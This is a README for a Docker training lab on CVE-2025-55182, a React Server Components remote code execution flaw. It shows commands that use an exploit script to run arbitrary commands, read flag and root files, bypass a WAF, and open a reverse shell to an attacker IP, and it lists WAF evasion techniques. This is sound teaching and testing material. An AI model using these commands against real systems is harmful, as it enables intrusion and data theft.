# CVE-2025-55182 Lab Environment

A comprehensive lab environment for testing and learning about CVE-2025-55182 (React Server Components Remote Code Execution).

## Quick Start

```bash
cd lab
docker-compose up --build
```

## Services

| Service | Port | Description |
|---------|------|-------------|
| Vulnerable | 3011 | Vulnerable Next.js app (React 19.2.0 + Next.js 15.4.0) |
| Patched | 3012 | Patched Next.js app (React 19.2.1 + Next.js 15.4.8) |
| WAF | 3013 | ModSecurity WAF protecting vulnerable instance |
| Dashboard | 8080 | Attack logging and monitoring dashboard |

## CTF Flags

The vulnerable instance contains 3 flags to find:

1. **Flag 1** - Environment Variables
   ```bash
   python ../react2shell.py http://localhost:3011 -c "env | grep FLAG"
   ```

2. **Flag 2** - Root Flag
   ```bash
   python ../react2shell.py http://localhost:3011 -c "cat /root/flag.txt"
   ```

3. **Flag 3** - Secret Directory
   ```bash
   python ../react2shell.py http://localhost:3011 -c "cat /app/secret/flag.txt"
   ```

## Testing Commands

### Scan for Vulnerability
```bash
# Test vulnerable instance
python ../react2shell.py http://localhost:3011

# Test patched instance (should timeout/fail)
python ../react2shell.py http://localhost:3012

# Test WAF-protected instance
python ../react2shell.py http://localhost:3013
```

### Execute Commands
```bash
# Run arbitrary commands
python ../react2shell.py http://localhost:3011 -c "id"
python ../react2shell.py http://localhost:3011 -c "whoami"
python ../react2shell.py http://localhost:3011 -c "ls -la /"
```

### WAF Bypass Testing
```bash
# Try WAF bypass with junk data padding
python ../react2shell.py http://localhost:3013 -c "id" --waf-bypass
```

### Reverse Shell
```bash
# Start listener
nc -lvnp 4444

# Send reverse shell
python ../react2shell.py http://localhost:3011 --reverse-shell YOUR_IP:4444
```

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                        Docker Network                        │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐      │
│  │  Vulnerable │    │   Patched   │    │     WAF     │      │
│  │   :3011     │    │   :3012     │    │   :3013     │      │
│  │             │    │             │    │      │      │      │
│  │ React 19.2.0│    │ React 19.2.1│    │      ▼      │      │
│  │ Next  15.4.0│    │ Next  15.4.8│    │ ModSecurity │      │
│  │             │    │             │    │      │      │      │
│  │  [FLAGS]    │    │  [SECURE]   │    │      ▼      │      │
│  │             │    │             │    │  Vulnerable │      │
│  └─────────────┘    └─────────────┘    └─────────────┘      │
│                                                              │
│  ┌─────────────────────────────────────────────────────┐    │
│  │                    Dashboard :8080                   │    │
│  │          Attack logging and monitoring               │    │
│  └─────────────────────────────────────────────────────┘    │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

## WAF Rules

The WAF includes custom ModSecurity rules that detect:

- RSC Accept headers (`text/x-component`)
- RSC-Action / Next-Action / x-action headers
- Prototype pollution patterns
- React Flight payload markers
- Command injection patterns
- Reverse shell patterns

Bypass techniques to explore:
- Case variations (next-ACTION, NEXT-action)
- Unicode/URL encoding
- Junk data padding (exceed inspection limits)
- Chunked transfer encoding
- Content-Type manipulation

## Stopping the Lab

```bash
docker-compose down
```

To remove all data:
```bash
docker-compose down -v --rmi all
```

## For Authorized Security Testing Only

This lab is designed for educational purposes and authorized penetration testing practice. Do not use these techniques against systems without explicit permission.
